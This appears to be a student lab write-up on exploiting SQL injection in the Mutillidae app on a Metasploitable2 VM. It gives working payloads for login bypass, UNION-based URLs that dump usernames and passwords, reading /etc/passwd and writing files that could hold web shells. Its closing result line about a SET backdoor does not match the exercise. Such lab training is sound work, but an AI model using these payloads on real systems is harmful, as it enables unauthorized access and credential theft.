# Metasploit
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![VirtualBox_MS2_29_04_2024_08_53_13](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/2ad0fcdd-a198-4f1c-ab9f-45595b592979)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_54_55](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/495a189a-f478-4699-a346-8c35f3c79a0f)




Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_55_38](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/1321f3b3-3ba7-44b4-b3df-a891af09f69f)


Click on the menu Login/Register and register for an account

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_56_53](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/dfa7a1a2-2b2d-4d3e-9af4-faeec5482bf1)


Click on the link “Please register here”

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_57_34](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/16a166c8-db98-4efc-93b8-185b4d4a1a71)



Click on “Create Account” to display the following page:

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_30_04_2024_08_25_26](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/4658d242-f1d8-4624-aa1c-001cdd3c91b2)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_30_04_2024_08_12_49](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/de1353a6-c0b5-4cd6-83ba-ae683a66bbe1)

Click “Login”. The logged in page will show as below:

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_30_04_2024_08_27_16](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/471acde5-baad-4aed-941c-087914d612da)


## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”
=================================================================
If you face error in registration follow the following steps in metasploitable 2:



This issue is caused by a misconfiguration in the config.inc located in the /var/www/mutillidae folder on Metasploitable 2 VM.

Edit config.inc
Edit config.inc file located in /var/www/mutillidae folder on Metasploitable 2 by typing the following commands [one at the time]:
cd /
sudo nano /var/www/mutillidae/config.inc
Type msfadmin when prompted for the root password. 
Once nano opens config.inc file, look for the line $dbname = ‘metasploit’ as shown in Figure  below:

![VirtualBox_MS2_30_04_2024_08_20_16](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/33180bad-4578-409a-a71a-fb4744419b82)


Replace ‘metasploit’ with ‘owasp10’ and make sure the lines end with semicolon ; as shown in Figure

![VirtualBox_MS2_30_04_2024_08_23_55](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/3b94b826-a356-4e5d-be12-5ab955a3453f)


Save and exit the config.inc
Save than exit the config.inc file by typing CTRL+X keys on your keyboard and the Y [Enter] when prompted to save the file
Restart the Apache server
To restart Apache, type the following command in the terminal. Alternatively, you can just reboot Metasploitalbe 2 VM.
sudo /etc/init.d/apache2 reload

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/e24d620f-da27-4d1c-9c29-108b4a3edf8c)

 Reset Mutillidae database
Refresh the page then clicking on the Reset DB menu option to reset the Mutillidae database [Figure ]. Click OK when prompted.

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/5b8057f6-e24c-43ce-8ac6-6a30f1e35567)


Test the new configuration
Alright. Now is time to test if we managed to fix the database issue. Go ahead and register a new account on the Mutillidae webpage.

 The Mutillidae database error no longer appears 

 ![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/5105c500-35a7-4027-aae1-9873167b2840)


===============================================================

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/2256486a-6a97-4a2e-8fe8-cafbce00d767)


Click the login button and you will see it enter into the administrator page.

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/a028084d-9060-42ee-af88-e4bec0572a81)



## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/7d9805a6-4417-438e-902a-00081fede02e)


![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/bd437355-d295-4ffe-aa3b-6ea2095b2ce7)


![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/9a54f004-cbc4-4853-a1b3-7ea615dffe09)

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/a78a91a9-ff9d-4425-850d-0865e064c792)

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/78d98086-32b3-4517-9f78-9f217b1d6c93)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.


![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/56d612e8-6f60-424b-b07a-c67502b38052)





Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/31bcbad5-8dde-4d7f-a8af-2bf28fc2c9f8)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/60f7fc6f-4727-455d-9738-1be321426f69)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/70978313-9567-4ecb-b3d3-41e3ece6fda6)


 As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/959b7880-39aa-4520-a224-42558ef547bc)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).


![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/ae3979e0-c067-4524-bf16-97ed0f4b1a05)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/c9c455e7-fbf1-4e59-a3bc-250197cdfec7)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/c1f9bdb0-98cb-496c-a837-164a146bc214)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/89537350-aefe-4029-9ca4-d0e3bf963a99)


The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/ab9cf812-6802-4e6a-a594-58438822d8a4)





The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/0ace36d8-bab4-40cd-98a0-8d7fc11c9dbb)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/71f9a71b-c94b-4607-835e-02b559467760)



## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Aishwarya-TM/EH-Ex-08/assets/127846109/b6dbbace-97af-4002-90d6-51bc04ded768)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).





## RESULT:
The Social Engineering Toolkit (SET) is used to create backdoor is  examined successfully
